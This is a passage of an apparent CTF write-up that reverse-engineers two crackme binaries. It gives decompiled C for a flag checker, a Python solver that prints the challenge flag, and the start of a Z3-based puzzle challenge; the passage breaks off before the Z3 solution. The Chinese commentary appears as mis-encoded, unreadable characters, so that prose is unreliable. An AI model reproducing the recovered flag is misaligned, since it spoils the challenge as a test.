<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_71247</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+20h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-ECh]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+28h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+2Ch] [rbp-E4h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+38h] [rbp-D8h]</span></span><br><span class="line">  __int128 v13[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">38</span>]; <span class="comment">// [rsp+70h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v12 = sub_717F0(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">2</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v5;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(v5 % i) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(v13 + v1) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 == DWORD1(v13[<span class="number">0</span>]) * DWORD2(v13[<span class="number">0</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    v15[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">1</span>] = <span class="number">13</span>;</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">3</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">4</span>] = <span class="number">10</span>;</span><br><span class="line">    v15[<span class="number">5</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">6</span>] = <span class="number">13</span>;</span><br><span class="line">    v15[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">8</span>] = <span class="number">2</span>;</span><br><span class="line">    v15[<span class="number">9</span>] = <span class="number">21</span>;</span><br><span class="line">    v15[<span class="number">10</span>] = <span class="number">7</span>;</span><br><span class="line">    v15[<span class="number">11</span>] = <span class="number">26</span>;</span><br><span class="line">    v15[<span class="number">12</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">13</span>] = <span class="number">2</span>;</span><br><span class="line">    v15[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">15</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">16</span>] = <span class="number">5</span>;</span><br><span class="line">    v15[<span class="number">17</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">18</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">19</span>] = <span class="number">21</span>;</span><br><span class="line">    v15[<span class="number">20</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">22</span>] = <span class="number">18</span>;</span><br><span class="line">    v15[<span class="number">23</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">24</span>] = <span class="number">10</span>;</span><br><span class="line">    v15[<span class="number">25</span>] = <span class="number">7</span>;</span><br><span class="line">    v15[<span class="number">26</span>] = <span class="number">5</span>;</span><br><span class="line">    v15[<span class="number">27</span>] = <span class="number">18</span>;</span><br><span class="line">    v15[<span class="number">28</span>] = <span class="number">0</span>;</span><br><span class="line">    v15[<span class="number">29</span>] = <span class="number">29</span>;</span><br><span class="line">    v15[<span class="number">30</span>] = <span class="number">23</span>;</span><br><span class="line">    v15[<span class="number">31</span>] = <span class="number">26</span>;</span><br><span class="line">    v15[<span class="number">32</span>] = <span class="number">24</span>;</span><br><span class="line">    v15[<span class="number">33</span>] = <span class="number">15</span>;</span><br><span class="line">    v15[<span class="number">34</span>] = <span class="number">29</span>;</span><br><span class="line">    v15[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">1LL</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">5</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v7++;</span><br><span class="line">        <span class="keyword">if</span> ( (a1[j] ^ a1[k]) != v15[v3] )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 *= a1[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">0x15F6D1945A0</span>LL )    <span class="comment">//â†‘head with lactf&#123;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">34</span>] == <span class="number">125</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">6</span>; m &lt;= <span class="number">33</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( flag != <span class="number">-1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            reset(flag);</span><br><span class="line">            flag = <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( lowcase(a1[m]) != <span class="number">1</span> || num(a1[m]) != <span class="number">1</span> || underline(a1[m]) != <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result = check(byte_70B00, <span class="string">&quot;vwbowpcjrhpkobfryu&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_32:</span><br><span class="line">  <span class="keyword">if</span> ( v16 != __readfsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    <span class="keyword">return</span> sub_71800();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//lowercase:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_68000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">96</span> || a1 &gt; <span class="number">122</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = dword_70AE4++;</span><br><span class="line">  byte_70B00[v2] = a1;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 == <span class="number">98</span> || a1 == <span class="number">99</span> || a1 == <span class="number">104</span> || a1 == <span class="number">115</span> || a1 == <span class="number">116</span>)</span><br><span class="line">    &amp;&amp; ++count != <span class="number">2</span></span><br><span class="line">    &amp;&amp; count != <span class="number">8</span></span><br><span class="line">    &amp;&amp; count != <span class="number">9</span></span><br><span class="line">    &amp;&amp; count != <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">100</span> )</span><br><span class="line">    flag = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//num:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_69000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">47</span> || a1 &gt; <span class="number">57</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 - <span class="number">48</span> != all_num % <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  all_num /= <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( count == <span class="number">3</span> )</span><br><span class="line">    flag = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//underline:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_70000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(a1 * a1 % <span class="number">9024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//reset:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">reset</span><span class="params">(<span class="type">char</span> flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    v1 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_71850(lowcase, <span class="number">4096LL</span>, v1) == <span class="number">-1</span> )</span><br><span class="line">    sub_717C0();</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">    v2 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_71850(num, <span class="number">4096LL</span>, v2) == <span class="number">-1</span> )</span><br><span class="line">    sub_717C0();</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">2</span> )</span><br><span class="line">    v3 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v3 = <span class="number">3</span>;</span><br><span class="line">  result = sub_71850(underline, <span class="number">4096LL</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_717C0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_710F9</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_710F9</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_70AE4; ++i )</span><br><span class="line">    byte_70B00[i] = (byte_70B00[i] - <span class="number">96</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  *(a3 + <span class="number">144</span>) = <span class="number">1LL</span>;</span><br><span class="line">  result = a3;</span><br><span class="line">  *(a3 + <span class="number">168</span>) = **(a3 + <span class="number">160</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ ˆå¸§å¯ä»¥å¾—çŸ¥<code>sub_71850()</code>å®é™…ä¸Šæ˜¯<code>mprotect()</code>  ç›´æ¥ç‚¹è¿›å»çœ‹ä¸åˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-224117.png" alt="image-20240223224117646"></p>
<p><code>mprotect()</code>å¯ä»¥è®¾ç½®ç¨‹åºå¯¹å‡½æ•°çš„æƒé™(wrx) 7å¯¹åº”çš„å°±æ˜¯wrx 3å¯¹åº”wr æ‰€ä»¥è¢«è®¾ç½®ä¸º7çš„å‡½æ•°å¯ä»¥æ‰§è¡Œ ç¨‹åºå°±æ˜¯é è¿™ä¸ªå‡½æ•°æ§åˆ¶æ§åˆ¶æµçš„ æ®æ­¤å¯ä»¥åˆ†æå‡ºç¨‹åºçš„æ‰€æœ‰é€»è¾‘:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1.è¯»å–åˆ°ç‰¹å®šå­—æ¯ä¼šå¯¼è‡´count<span class="built_in">_</span>2 += 1</span><br><span class="line">2.è¯»å–åˆ°å­—æ¯ä¼šå‘byte<span class="built_in">_</span>70B00ä¸­æ·»åŠ å¯¹åº”å­—æ¯</span><br><span class="line">3.é™¤äº†ç¬¬2, 8, 9, 12ä¸ªç‰¹å®šå­—æ¯ä»¥å¤–ç‰¹å®šå­—æ¯åå¿…é¡»è·Ÿæ•°å­—</span><br><span class="line">4.å­—æ¯dåå¿…é¡»è·Ÿä¸‹åˆ’çº¿</span><br><span class="line">5.æ™®é€šå­—æ¯åå¿…é¡»è·Ÿå­—æ¯</span><br><span class="line">6.ç¬¬ä¸‰ä¸ªç‰¹æ®Šå­—æ¯åçš„ç¬¬ä¸€ä¸ªæ•°å­—å¿…é¡»è·Ÿä¸‹åˆ’çº¿</span><br><span class="line">7.å¦åˆ™æ•°å­—åå¿…é¡»è·Ÿå­—æ¯</span><br><span class="line">8.ä¸‹åˆ’çº¿åå¿…é¡»è·Ÿå­—æ¯</span><br></pre></td></tr></table></figure>

<p>åŠ¨è°ƒä¸­è¿˜å‘ç°è¯»å–åˆ°å­—æ¯æ—¶å°±ä¼šè§¦å‘ä¸¤æ¬¡mainä¸­çš„<code>v4[0] = sub_710F9</code>(ä¸æ¸…æ¥šåŸç† mprotectå¯¼è‡´è°ƒè¯•å™¨æ— æ³•æ­£å¸¸è§¦å‘æ–­ç‚¹ æ— æ³•æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„æ±‡ç¼–ä»£ç  ä¼°è®¡æ˜¯é€šè¿‡å¼‚å¸¸å¤„ç†è§¦å‘çš„) æ®æ­¤å†™å‡ºè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;vwbowpcjrhpkobfryuryuryu&quot;</span>]</span><br><span class="line">number_table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;10430031&quot;</span>]</span><br><span class="line">special = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;bchst&quot;</span>]</span><br><span class="line">flag = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;lactf&#123;&quot;</span>]</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">f2 = <span class="number">0</span></span><br><span class="line">ind = <span class="number">6</span></span><br><span class="line">ind_for_num = <span class="number">0</span></span><br><span class="line">ind_for_alpha = <span class="number">0</span></span><br><span class="line">ind_for_alpha_in_table = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(ind &lt;= <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        now = (key[ind_for_alpha] - <span class="number">97</span> + <span class="number">100</span> * <span class="number">26</span> - <span class="number">2</span> * (<span class="number">34</span> - ind)) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        flag.append(<span class="built_in">chr</span>(now))</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        ind_for_alpha += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> now <span class="keyword">in</span> special:</span><br><span class="line">            ind_for_alpha_in_table += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ind_for_alpha_in_table != <span class="number">2</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">8</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">9</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">12</span>:</span><br><span class="line">                f = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> now == <span class="number">100</span>:</span><br><span class="line">            f = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ind_for_alpha_in_table == <span class="number">3</span>:</span><br><span class="line">            f2 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        now = number_table[ind_for_num]</span><br><span class="line">        flag.append(now)</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        ind_for_num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> f2:</span><br><span class="line">            f = <span class="number">2</span></span><br><span class="line">            f2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">2</span>:</span><br><span class="line">        flag.append(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># lactf&#123;rub1sc0_b4s3d_ph0t0synth3s1s&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="puzzlepalooza-Z3"><a href="#puzzlepalooza-Z3" class="headerlink" title="puzzlepalooza | Z3"></a><strong>puzzlepalooza</strong> | Z3</h2><p>DIEæŸ¥å£³ æ— å£³64x IDA64æ‰“å¼€:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  __m128i key; <span class="comment">// [rsp+0h] [rbp-F8h]</span></span><br><span class="line">  __m128i v21[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-E8h]</span></span><br><span class="line">  __int128 v22[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-C8h] BYREF</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+50h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+58h] [rbp-A0h]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+5Ch] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [rsp+5Eh] [rbp-9Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [rsp+60h] [rbp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the greatest puzzlepalooza ever!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you solve our puzzle without looking?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">54</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    key = _mm_load_si128(&amp;xmmword_5632A397C0E0);</span><br><span class="line">    v21[<span class="number">0</span>] = _mm_load_si128(&amp;xmmword_5632A397C0F0);</span><br><span class="line">    *(v21 + <span class="number">9</span>) = _mm_load_si128(&amp;xmmword_5632A397C100);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *v3 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">0x3F</span>u )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      key.get_sbyte[v4 &gt;&gt; <span class="number">3</span>] ^= v5 &lt;&lt; (v4 &amp; <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">7u</span>) &gt; <span class="number">2</span> )</span><br><span class="line">        key.get_sbyte[(v4 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] ^= v5 &gt;&gt; (<span class="number">8</span> - (v4 &amp; <span class="number">7</span>));</span><br><span class="line">      v4 += <span class="number">6</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">324</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (key.get_sbyte[<span class="number">0</span>] &amp; <span class="number">0xF</span>u) &lt;= <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( ++v7 != <span class="number">81</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ((key.get_ubyte[v7 &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * (v7 &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>u) &gt; <span class="number">8</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">          &#125;</span><br><span class="line">          v8 = v22;</span><br><span class="line">          v25 = <span class="number">1871</span>;</span><br><span class="line">          v23 = <span class="number">0x64A0847033B0136</span>LL;</span><br><span class="line">          v22[<span class="number">0</span>] = _mm_load_si128(&amp;xmmword_5632A397C0C0);</span><br><span class="line">          v24 = <span class="number">38667339</span>;</span><br><span class="line">          v22[<span class="number">1</span>] = _mm_load_si128(&amp;xmmword_5632A397C0D0);</span><br><span class="line">          <span class="keyword">while</span> ( v8[<span class="number">1</span>] == ((key.get_ubyte[*v8 &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * (*v8 &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ( &amp;v26 == v8 )</span><br><span class="line">            &#123;</span><br><span class="line">              v9 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v10 = v9;</span><br><span class="line">                v11 = <span class="number">0</span>;</span><br><span class="line">                v12 = <span class="number">0</span>;</span><br><span class="line">                v13 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">9</span>; ++i )</span><br><span class="line">                &#123;</span><br><span class="line">                  v13 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[(i + <span class="number">9</span> * v9) &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * ((i + <span class="number">9</span> * v9) &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>);</span><br><span class="line">                  v15 = v10;</span><br><span class="line">                  v16 = <span class="number">4</span> * (v10 &amp; <span class="number">1</span>);</span><br><span class="line">                  v10 += <span class="number">9</span>;</span><br><span class="line">                  v12 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[v15 &gt;&gt; <span class="number">1</span>] &gt;&gt; v16) &amp; <span class="number">0xF</span>);</span><br><span class="line">                  v17 = i / <span class="number">3</span> + v9 - v9 % <span class="number">3</span>;</span><br><span class="line">                  v18 = <span class="number">3</span> * (i / <span class="number">3</span>);</span><br><span class="line">                  v19 = i;</span><br><span class="line">                  v11 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[(<span class="number">3</span> * (v9 % <span class="number">3</span>) + v19 - v18 + <span class="number">9</span> * v17) &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span></span><br><span class="line">                                                                                           * ((<span class="number">3</span> * (v9 % <span class="number">3</span>)</span><br><span class="line">                                                                                             + v19</span><br><span class="line">                                                                                             - v18</span><br><span class="line">                                                                                             + <span class="number">9</span> * v17) &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( v12 != <span class="number">511</span> || v13 != <span class="number">511</span> || v11 != <span class="number">511</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( ++v9 == <span class="number">9</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;Woah! You&#x27;re so good at puzzles!&quot;</span>);</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not a valid solution you silly goose!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>z3æ±‚è§£ç¬¦åˆæ¡ä»¶çš„flag:</p>
